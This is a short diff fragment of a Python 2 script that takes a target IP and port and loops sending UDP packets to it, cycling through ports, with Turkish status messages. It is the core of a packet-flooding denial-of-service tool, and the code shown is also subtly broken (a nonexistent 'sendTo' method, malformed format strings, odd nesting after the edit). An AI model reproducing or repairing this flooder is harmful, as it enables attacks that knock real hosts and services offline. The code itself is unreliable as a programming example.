@@ -27,16 +27,16 @@ print ("""
 ip = raw_input("\033[1;33;40mIP: ");
 port = input("\033[1;33;40mPort: ");
 os.system("clear");
-sent = 0;
+sent = 0
 while True:
   while 1:
     if time.time() > timeout:
-           break;
-       else:
-           pass;
-      sock.sendTo(bytes, (ip, port));
-      sent = sent + 1;
-      port = port + 1;
-      print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent, ip, port);
-      if port == 65534:
-        port = 1;
+        break
+      else:
+        pass
+        sock.sendTo(bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+        print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent, ip, port)
+        if port == 65534:
+          port = 1
